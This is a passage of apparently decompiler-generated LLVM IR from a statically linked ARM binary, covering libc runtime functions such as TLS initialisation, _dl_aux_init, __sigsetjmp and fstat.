  store i32 %v2_162a4, i32* %r3.global-to-local, align 4
  %v7_162a8 = icmp eq i32 %v2_162a4, 7
  br i1 %v7_162a8, label %dec_label_pc_162b0, label %dec_label_pc_162dc

dec_label_pc_162b0:                               ; preds = %dec_label_pc_162a4
  %v1_162b0 = add i32 %v0_162bc66, 20
  %v2_162b0 = inttoptr i32 %v1_162b0 to i32*
  %v3_162b0 = load i32, i32* %v2_162b0, align 4
  store i32 %v3_162b0, i32* %r3.global-to-local, align 4
  %v1_162b4 = add i32 %v0_162bc66, 28
  %v2_162b4 = inttoptr i32 %v1_162b4 to i32*
  %v3_162b4 = load i32, i32* %v2_162b4, align 4
  store i32 %v3_162b4, i32* @r6, align 4
  %v1_162bc = add i32 %v0_162bc66, 16
  %v2_162bc = inttoptr i32 %v1_162bc to i32*
  %v3_162bc = load i32, i32* %v2_162bc, align 4
  store i32 %v3_162bc, i32* %r3.global-to-local, align 4
  %v1_162c0 = add i32 %v0_162bc66, 8
  %v2_162c0 = inttoptr i32 %v1_162c0 to i32*
  %v3_162c0 = load i32, i32* %v2_162c0, align 4
  store i32 %v3_162c0, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_162b4, %v0_1628c
  %v0_1628c.v3_162b4 = select i1 %tmp78, i32 %v0_1628c, i32 %v3_162b4
  store i32 %v0_1628c.v3_162b4, i32* %fp.global-to-local, align 4
  %v2_162f8 = icmp eq i32 %v3_162b4, 0
  br i1 %v2_162f8, label %dec_label_pc_16320, label %bb

dec_label_pc_162dc:                               ; preds = %dec_label_pc_162a4
  %v1_162dc = add i32 %v0_162bc66, 32
  store i32 %v1_162dc, i32* %r1.global-to-local, align 4
  %v2_162e0 = load i32, i32* %v1_162e0, align 4
  %v4_162e4 = mul i32 %v2_162e0, 32
  %v5_162e4 = add i32 %v4_162e4, %v2_1627c
  store i32 %v5_162e4, i32* %r3.global-to-local, align 4
  %v3_162e8 = icmp ult i32 %v1_162dc, %v5_162e4
  br i1 %v3_162e8, label %dec_label_pc_162a4, label %dec_label_pc_162e0.dec_label_pc_16454.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_162b0
  %v2_162fc = add i32 %v3_162b4, -1
  br label %dec_label_pc_16324

dec_label_pc_16320:                               ; preds = %dec_label_pc_162b0, %dec_label_pc_16454
  %v0_16334.pre = phi i32 [ %v0_16334.pre.pre, %dec_label_pc_16454 ], [ ptrtoint (i32* @global_var_20cf4.602 to i32), %dec_label_pc_162b0 ]
  %v1_16324.pre = phi i32 [ %v1_16324.pre.pre, %dec_label_pc_16454 ], [ %v0_16288, %dec_label_pc_162b0 ]
  %v1_1634825 = phi i32 [ %v0_1645c, %dec_label_pc_16454 ], [ %v0_1628c.v3_162b4, %dec_label_pc_162b0 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_16454 ], [ %v3_162b0, %dec_label_pc_162b0 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_16454 ], [ %v3_162bc, %dec_label_pc_162b0 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_16454 ], [ %v3_162c0, %dec_label_pc_162b0 ]
  br label %dec_label_pc_16324

dec_label_pc_16324:                               ; preds = %bb, %dec_label_pc_16320
  %storemerge80 = phi i32 [ %v2_162fc, %bb ], [ 0, %dec_label_pc_16320 ]
  %v0_16324 = phi i32 [ %v2_162fc, %bb ], [ 0, %dec_label_pc_16320 ]
  %storemerge = phi i32 [ %v3_162b4, %bb ], [ 1, %dec_label_pc_16320 ]
  %storemerge79 = phi i32 [ %v3_162b4, %bb ], [ 1, %dec_label_pc_16320 ]
  %v0_16334 = phi i32 [ ptrtoint (i32* @global_var_20cf4.602 to i32), %bb ], [ %v0_16334.pre, %dec_label_pc_16320 ]
  %v1_16324 = phi i32 [ %v0_16288, %bb ], [ %v1_16324.pre, %dec_label_pc_16320 ]
  %v1_16348 = phi i32 [ %v0_1628c.v3_162b4, %bb ], [ %v1_1634825, %dec_label_pc_16320 ]
  %stack_var_-52.3 = phi i32 [ %v3_162b0, %bb ], [ %stack_var_-52.0, %dec_label_pc_16320 ]
  %stack_var_-48.3 = phi i32 [ %v3_162bc, %bb ], [ %stack_var_-48.0, %dec_label_pc_16320 ]
  %stack_var_-44.3 = phi i32 [ %v3_162c0, %bb ], [ %stack_var_-44.0, %dec_label_pc_16320 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_16324 = add i32 %v1_16324, %v0_16324
  %v2_16328 = udiv i32 %v2_16324, %storemerge
  store i32 %v2_16328, i32* %r0.global-to-local, align 4
  %v2_1632c = mul i32 %v2_16328, %storemerge
  store i32 %v2_1632c, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_16334 = add i32 %v0_16334, 72
  %v3_16334 = inttoptr i32 %v2_16334 to i32*
  %v4_16334 = load i32, i32* %v3_16334, align 4
  store i32 %v4_16334, i32* %r3.global-to-local, align 4
  %v1_16338 = inttoptr i32 %v4_16334 to i32*
  %v2_16338 = load i32, i32* %v1_16338, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_16340 = add i32 %v1_16348, 1168
  %v2_16344 = add i32 %v1_16340, %stack_var_-52.3
  %v2_16348 = add i32 %v2_16344, %v2_1632c
  %v2_1634c = add i32 %v2_16348, %v2_16338
  store i32 %v2_1634c, i32* %r0.global-to-local, align 4
  %v1_16350 = call i32 @__GI_sbrk(i32 %v2_1634c)
  %v1_16354 = load i32, i32* %fp.global-to-local, align 4
  %v1_1635c = sub i32 0, %v1_16354
  store i32 10232, i32* %r4.global-to-local, align 4
  %v2_16354 = add i32 %v1_16350, 1167
  %v1_16364 = add i32 %v2_16354, %v1_16354
  %v2_16368 = and i32 %v1_16364, %v1_1635c
  store i32 %v2_16368, i32* @r5, align 4
  %v1_16370 = load i32, i32* %sl.global-to-local, align 4
  %v3_16370 = add i32 %v1_16370, 10232
  %v4_16370 = inttoptr i32 %v3_16370 to i32*
  store i32 62, i32* %v4_16370, align 4
  %v0_16378 = load i32, i32* @r5, align 4
  %v1_16378 = load i32, i32* %sb.global-to-local, align 4
  %v2_16378 = add i32 %v1_16378, %v0_16378
  store i32 %v2_16378, i32* @ip, align 4
  %v0_1637c = load i32, i32* %sl.global-to-local, align 4
  %v1_1637c = load i32, i32* %r4.global-to-local, align 4
  %v2_1637c = add i32 %v1_1637c, %v0_1637c
  store i32 %v2_1637c, i32* %r4.global-to-local, align 4
  %v2_16380 = add i32 %v0_1637c, 11520
  store i32 %v2_16380, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_16378, i32* @r0, align 4
  %v2_16394 = add i32 %v2_1637c, 16
  %v3_16394 = inttoptr i32 %v2_16394 to i32*
  store i32 %v2_16378, i32* %v3_16394, align 4
  %v0_16398 = load i32, i32* %sb.global-to-local, align 4
  %v1_16398 = load i32, i32* %r8.global-to-local, align 4
  %v2_16398 = add i32 %v1_16398, 40
  %v3_16398 = inttoptr i32 %v2_16398 to i32*
  store i32 %v0_16398, i32* %v3_16398, align 4
  %v0_1639c = load i32, i32* @r3, align 4
  %v1_1639c = trunc i32 %v0_1639c to i8
  %v2_1639c = load i32, i32* %r4.global-to-local, align 4
  %v3_1639c = add i32 %v2_1639c, 20
  %v4_1639c = inttoptr i32 %v3_1639c to i8*
  store i8 %v1_1639c, i8* %v4_1639c, align 1
  %v0_163a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_163a0 = add i32 %v0_163a0, 8
  store i32 %v1_163a0, i32* @r4, align 4
  %v0_163a4 = call i32 @memcpy()
  %v0_163ac = load i32, i32* @r4, align 4
  %v1_163ac = load i32, i32* @r5, align 4
  %v2_163ac = inttoptr i32 %v1_163ac to i32*
  store i32 %v0_163ac, i32* %v2_163ac, align 4
  %v0_163b0 = load i32, i32* @r5, align 4
  store i32 %v0_163b0, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_163b0, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_11d38.772 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_163c4 = load i32, i32* %sl.global-to-local, align 4
  %v2_163c4 = add i32 %v0_163c4, 84
  %v3_163c4 = inttoptr i32 %v2_163c4 to i32*
  %v4_163c4 = load i32, i32* %v3_163c4, align 4
  store i32 %v4_163c4, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10744, i32* %r1.global-to-local, align 4
  %v2_163d0 = add i32 %v0_163c4, 60
  %v3_163d0 = inttoptr i32 %v2_163d0 to i32*
  %v4_163d0 = load i32, i32* %v3_163d0, align 4
  store i32 %v4_163d0, i32* %r0.global-to-local, align 4
  %v3_163d8 = add i32 %v0_163c4, 10744
  %v4_163d8 = inttoptr i32 %v3_163d8 to i32*
  store i32 64, i32* %v4_163d8, align 4
  %v1_163e0 = load i32, i32* %r8.global-to-local, align 4
  %v2_163e0 = add i32 %v1_163e0, 20
  %v3_163e0 = inttoptr i32 %v2_163e0 to i32*
  store i32 %stack_var_-44.3, i32* %v3_163e0, align 4
  %v1_163e8 = load i32, i32* %r8.global-to-local, align 4
  %v2_163e8 = add i32 %v1_163e8, 24
  %v3_163e8 = inttoptr i32 %v2_163e8 to i32*
  store i32 %stack_var_-48.3, i32* %v3_163e8, align 4
  %v1_163f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_163f0 = inttoptr i32 %v1_163f0 to i32*
  store i32 1, i32* %v2_163f0, align 4
  %v1_163f8 = load i32, i32* %r8.global-to-local, align 4
  %v2_163f8 = add i32 %v1_163f8, 28
  %v3_163f8 = inttoptr i32 %v2_163f8 to i32*
  store i32 %stack_var_-52.3, i32* %v3_163f8, align 4
  %v0_16400 = load i32, i32* @r6, align 4
  %v2_16400 = icmp eq i32 %v0_16400, 0
  %v1_16404 = load i32, i32* %r8.global-to-local, align 4
  %v2_16404 = add i32 %v1_16404, 44
  %v3_16404 = inttoptr i32 %v2_16404 to i32*
  store i32 1, i32* %v3_16404, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_1640c = load i32, i32* %sl.global-to-local, align 4
  %v1_1640c = load i32, i32* %r1.global-to-local, align 4
  %v2_1640c = add i32 %v1_1640c, %v0_1640c
  store i32 %v2_1640c, i32* %r2.global-to-local, align 4
  %v1_16410 = load i32, i32* @r6, align 4
  br i1 %v2_16400, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_16324
  store i32 %v1_16410, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1641c34 = load i32, i32* %r8.global-to-local, align 4
  %v2_1641c35 = add i32 %v1_1641c34, 32
  %v3_1641c36 = inttoptr i32 %v2_1641c35 to i32*
  store i32 %v1_16410, i32* %v3_1641c36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_16324
  %v2_16414 = add i32 %v1_16410, -1
  store i32 %v2_16414, i32* %r0.global-to-local, align 4
  %v1_1641c = load i32, i32* %r8.global-to-local, align 4
  %v2_1641c = add i32 %v1_1641c, 32
  %v3_1641c = inttoptr i32 %v2_1641c to i32*
  store i32 %v1_16410, i32* %v3_1641c, align 4
  %v1_16420 = load i32, i32* @r6, align 4
  store i32 %v1_16420, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_16424 = load i32, i32* %r8.global-to-local, align 4
  %v1_16424 = load i32, i32* %r2.global-to-local, align 4
  %v2_16424 = add i32 %v1_16424, 28
  %v3_16424 = inttoptr i32 %v2_16424 to i32*
  store i32 %v0_16424, i32* %v3_16424, align 4
  %v0_16428 = load i32, i32* %r2.global-to-local, align 4
  %v1_16428 = load i32, i32* %ip.global-to-local, align 4
  %v2_16428 = inttoptr i32 %v1_16428 to i32*
  store i32 %v0_16428, i32* %v2_16428, align 4
  %v0_1642c = load i32, i32* %r0.global-to-local, align 4
  %v1_1642c = load i32, i32* %r3.global-to-local, align 4
  %v2_1642c = add i32 %v1_1642c, %v0_1642c
  store i32 %v2_1642c, i32* %r0.global-to-local, align 4
  %v1_16430 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_16400, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_16438.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_16438 = phi i32 [ %v0_16438.pre, %._crit_edge ], [ %v1_16430, %bb54 ]
  %v2_16434 = udiv i32 %v2_1642c, %v1_16430
  %v2_16438 = load i32, i32* %sb.global-to-local, align 4
  %v3_16438 = mul i32 %v2_16434, %v0_16438
  %v4_16438 = add i32 %v2_16438, %v3_16438
  store i32 %v4_16438, i32* @r0, align 4
  %v0_1643c = load i32, i32* %fp.global-to-local, align 4
  %v2_1643c = icmp ult i32 %v0_1643c, 16
  %v0_1643c. = select i1 %v2_1643c, i32 16, i32 %v0_1643c
  store i32 %v0_1643c., i32* @r1, align 4
  %v2_1644c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1644c, i32* @r4, align 4
  store i32 %v6_16268, i32* @r5, align 4
  store i32 %v15_16268, i32* %r8.global-to-local, align 4
  store i32 %v18_16268, i32* %sb.global-to-local, align 4
  store i32 %v21_16268, i32* %sl.global-to-local, align 4
  store i32 %v24_16268, i32* %fp.global-to-local, align 4
  store i32 %v27_16268, i32* @lr, align 4
  %v0_16450 = call i32 @init_static_tls()
  store i32 %v0_16450, i32* %r0.global-to-local, align 4
  %v0_1645c.pre = load i32, i32* @ip, align 4
  %v1_16324.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_16334.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_16454

dec_label_pc_162e0.dec_label_pc_16454.loopexit_crit_edge: ; preds = %dec_label_pc_162dc
  br label %dec_label_pc_16454.loopexit

dec_label_pc_16454.loopexit:                      ; preds = %dec_label_pc_162e0.dec_label_pc_16454.loopexit_crit_edge, %dec_label_pc_16294
  br label %dec_label_pc_16454

dec_label_pc_16454:                               ; preds = %dec_label_pc_16454.loopexit, %entry, %bb55
  %v0_16334.pre.pre = phi i32 [ ptrtoint (i32* @global_var_20cf4.602 to i32), %dec_label_pc_16454.loopexit ], [ ptrtoint (i32* @global_var_20cf4.602 to i32), %entry ], [ %v0_16334.pre.pre.pre, %bb55 ]
  %v1_16324.pre.pre = phi i32 [ %v0_16288, %dec_label_pc_16454.loopexit ], [ %v0_16288, %entry ], [ %v1_16324.pre.pre.pre, %bb55 ]
  %v0_1645c = phi i32 [ %v0_1628c, %dec_label_pc_16454.loopexit ], [ %v0_1628c, %entry ], [ %v0_1645c.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_1645c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_16320

; uselistorder directives
  uselistorder i32 %v0_1645c, { 1, 0 }
  uselistorder i32 %v1_16410, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1637c, { 1, 0 }
  uselistorder i32 %v2_16378, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_162dc, { 2, 1, 0 }
  uselistorder i32 %v3_162b4, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_162bc66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_162e0, { 1, 0 }
  uselistorder i32 %v0_1628c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_16288, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1627c, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 7, 6, 8, 9, 10, 11, 12, 3, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10744, { 0, 2, 1 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 1, 2, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_16454, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_16324, { 1, 0 }
  uselistorder label %dec_label_pc_16320, { 1, 0 }
  uselistorder label %dec_label_pc_162a4, { 1, 0 }
}

define i32 @function_16474(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_16474:
  %v0_16474 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16474, label %.thread2, label %.thread7

.thread2:                                         ; preds = %dec_label_pc_16474
  call void @llvm.trap()
  unreachable

.thread7:                                         ; preds = %dec_label_pc_16474
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_164a0 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_164a0
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r2.global-to-local, align 4
  %v4_164b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 156) to i32*), align 4
  %v4_164b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 104) to i32*), align 4
  store i32 %v4_164b8, i32* %r1.global-to-local, align 4
  %v1_164bc = add i32 %arg1, 44
  %v2_164bc = inttoptr i32 %v1_164bc to i32*
  %v3_164bc = load i32, i32* %v2_164bc, align 4
  %v1_164c0 = add i32 %arg1, 28
  %v2_164c0 = inttoptr i32 %v1_164c0 to i32*
  %v3_164c0 = load i32, i32* %v2_164c0, align 4
  store i32 %v3_164c0, i32* %r2.global-to-local, align 4
  %v2_164c4 = inttoptr i32 %v4_164b0 to i32*
  store i32 %v3_164bc, i32* %v2_164c4, align 4
  %v0_164c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_164c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_164c8 = inttoptr i32 %v1_164c8 to i32*
  store i32 %v0_164c8, i32* %v2_164c8, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_164d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_164d4:
  %v0_164d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_164d4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_164d4
  %v1_164d4 = load i32, i32* @ip, align 4
  %v3_164d4 = mul i32 %v1_164d4, %arg1
  %v2_164d8 = load i32, i32* @r8, align 4
  %v4_164d8 = and i32 %v2_164d8, %v3_164d4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_164d4, %bb
  %v5_164d8 = phi i32 [ %arg1, %dec_label_pc_164d4 ], [ %v4_164d8, %bb ]
  ret i32 %v5_164d8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_164e4 = add i32 %arg1, 40
  store i32 %v1_164e4, i32* %r2.global-to-local, align 4
  %v1_164e8 = inttoptr i32 %v1_164e4 to i32*
  %v2_164e8 = load i32, i32* %v1_164e8, align 4
  store i32 %v2_164e8, i32* %r2.global-to-local, align 4
  %v3_164e8 = add i32 %arg1, 44
  %v4_164e8 = inttoptr i32 %v3_164e8 to i32*
  %v5_164e8 = load i32, i32* %v4_164e8, align 4
  store i32 %v5_164e8, i32* %r3.global-to-local, align 4
  %v0_164ec = call i32 @__aeabi_read_tp()
  %v1_164f0 = inttoptr i32 %v0_164ec to i32*
  %v2_164f0 = load i32, i32* %v1_164f0, align 4
  store i32 %v2_164f0, i32* %r1.global-to-local, align 4
  %v3_164f4 = mul i32 %v5_164e8, 8
  store i32 %v3_164f4, i32* %r3.global-to-local, align 4
  %v1_164f8 = load i32, i32* %r2.global-to-local, align 4
  %v2_164f8 = add i32 %v1_164f8, %v0_164ec
  %v3_164fc = add i32 %v3_164f4, %v2_164f0
  %v4_164fc = inttoptr i32 %v3_164fc to i32*
  store i32 %v2_164f8, i32* %v4_164fc, align 4
  %v0_16500 = load i32, i32* %r3.global-to-local, align 4
  %v1_16500 = load i32, i32* %r1.global-to-local, align 4
  %v2_16500 = add i32 %v1_16500, %v0_16500
  store i32 %v2_16500, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_16508 = add i32 %v2_16500, 4
  %v5_16508 = inttoptr i32 %v4_16508 to i8*
  store i8 1, i8* %v5_16508, align 1
  %v0_1650c = load i32, i32* @r4, align 4
  %v1_1650c = add i32 %v0_1650c, 20
  store i32 %v1_1650c, i32* %r1.global-to-local, align 4
  %v1_16510 = inttoptr i32 %v1_1650c to i32*
  %v2_16510 = load i32, i32* %v1_16510, align 4
  store i32 %v2_16510, i32* @r1, align 4
  %v3_16510 = add i32 %v0_1650c, 24
  %v4_16510 = inttoptr i32 %v3_16510 to i32*
  %v5_16510 = load i32, i32* %v4_16510, align 4
  store i32 %v5_16510, i32* %r2.global-to-local, align 4
  %v5_16514 = call i32 @__GI_mempcpy(i32 %v2_164f8, i32 %v2_16510, i32 %v5_16510, i32 1)
  %v0_16518 = load i32, i32* @r4, align 4
  %v1_16518 = add i32 %v0_16518, 28
  store i32 %v1_16518, i32* %r3.global-to-local, align 4
  %v1_1651c = inttoptr i32 %v1_16518 to i32*
  %v2_1651c = load i32, i32* %v1_1651c, align 4
  store i32 %v2_1651c, i32* %r2.global-to-local, align 4
  %v3_1651c = add i32 %v0_16518, 24
  %v4_1651c = inttoptr i32 %v3_1651c to i32*
  %v5_1651c = load i32, i32* %v4_1651c, align 4
  store i32 %v5_1651c, i32* %r3.global-to-local, align 4
  %v2_16520 = sub i32 %v5_1651c, %v2_1651c
  store i32 %v2_16520, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_16528 = inttoptr i32 %v5_16514 to i8*
  %v4_16528 = call i32 @__GI_memset(i8* %v3_16528, i32 0, i32 %v2_16520)
  ret i32 %v4_16528

; uselistorder directives
  uselistorder i32 %v3_164f4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_16578:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 11572) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_1658c = load i32, i32* @r0, align 4
  %v1_16590 = inttoptr i32 %v0_1658c to i32*
  %v2_16590 = load i32, i32* @r4, align 4
  store i32 %v2_16590, i32* %v1_16590, align 4
  %v3_16590 = add i32 %v0_1658c, 4
  %v4_16590 = inttoptr i32 %v3_16590 to i32*
  %v5_16590 = load i32, i32* @r5, align 4
  store i32 %v5_16590, i32* %v4_16590, align 4
  %v6_16590 = add i32 %v0_1658c, 8
  %v7_16590 = inttoptr i32 %v6_16590 to i32*
  %v8_16590 = load i32, i32* @r6, align 4
  store i32 %v8_16590, i32* %v7_16590, align 4
  %v9_16590 = add i32 %v0_1658c, 12
  %v10_16590 = inttoptr i32 %v9_16590 to i32*
  %v11_16590 = load i32, i32* @r7, align 4
  store i32 %v11_16590, i32* %v10_16590, align 4
  %v12_16590 = add i32 %v0_1658c, 16
  %v13_16590 = inttoptr i32 %v12_16590 to i32*
  %v14_16590 = load i32, i32* @r8, align 4
  store i32 %v14_16590, i32* %v13_16590, align 4
  %v15_16590 = add i32 %v0_1658c, 20
  %v16_16590 = inttoptr i32 %v15_16590 to i32*
  %v17_16590 = load i32, i32* @sb, align 4
  store i32 %v17_16590, i32* %v16_16590, align 4
  %v18_16590 = add i32 %v0_1658c, 24
  %v19_16590 = inttoptr i32 %v18_16590 to i32*
  %v20_16590 = load i32, i32* @sl, align 4
  store i32 %v20_16590, i32* %v19_16590, align 4
  %v21_16590 = add i32 %v0_1658c, 28
  %v22_16590 = inttoptr i32 %v21_16590 to i32*
  %v23_16590 = load i32, i32* @fp, align 4
  store i32 %v23_16590, i32* %v22_16590, align 4
  %v24_16590 = add i32 %v0_1658c, 32
  %v25_16590 = inttoptr i32 %v24_16590 to i32*
  %v27_16590 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_16590, i32* %v25_16590, align 4
  %v28_16590 = add i32 %v0_1658c, 36
  %v29_16590 = inttoptr i32 %v28_16590 to i32*
  %v30_16590 = load i32, i32* @lr, align 4
  store i32 %v30_16590, i32* %v29_16590, align 4
  %v0_16594 = call i32 @__sigjmp_save()
  ret i32 %v0_16594

; uselistorder directives
  uselistorder i32 %v0_1658c, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 73, 74, 3, 4, 5, 6, 7, 8, 9, 10, 60, 61, 62, 63, 64, 66, 65, 67, 11, 12, 17, 18, 13, 14, 15, 16, 19, 20, 21, 22, 23, 24, 25, 0, 26, 27, 28, 29, 30, 31, 32, 1, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 68, 69, 70, 2, 71, 72, 75 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_165a0 = load i32, i32* @r1, align 4
  store i32 %v0_165a0, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_165b0 = load i32, i32* @r0, align 4
  store i32 %v0_165b0, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_165b0, -4095
  br i1 %tmp, label %dec_label_pc_165d8, label %dec_label_pc_165bc

dec_label_pc_165bc:                               ; preds = %entry
  %v0_165c0 = call i32 @__aeabi_read_tp()
  %v3_165c4 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_165c4 = sext i16 %v3_165c4 to i32
  store i32 %v4_165c4, i32* @r3, align 4
  %v0_165c8 = load i32, i32* @r2, align 4
  %v1_165c8 = sub i32 0, %v0_165c8
  store i32 %v1_165c8, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_165d0 = add i32 %v4_165c4, %v0_165c0
  %v4_165d0 = inttoptr i32 %v3_165d0 to i32*
  store i32 %v1_165c8, i32* %v4_165d0, align 4
  br label %dec_label_pc_165e8

dec_label_pc_165d8:                               ; preds = %entry
  store i32 %v0_165b0, i32* %r7.global-to-local, align 4
  %v2_165d8 = icmp eq i32 %v0_165b0, 0
  br i1 %v2_165d8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_165d8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_165d8, %bb
  call void @__pseudo_cond_branch(i1 %v2_165d8, i32 ptrtoint (i32* @global_var_166c8.926 to i32))
  br label %dec_label_pc_165e8

dec_label_pc_165e8:                               ; preds = %dec_label_pc_165bc, %.thread
  %v0_165e8 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_165e8

; uselistorder directives
  uselistorder i32 %v0_165b0, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_165e8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_165fc = load i32, i32* @r4, align 4
  store i32 %v3_165fc, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_16614 = inttoptr i32 %arg2 to i8*
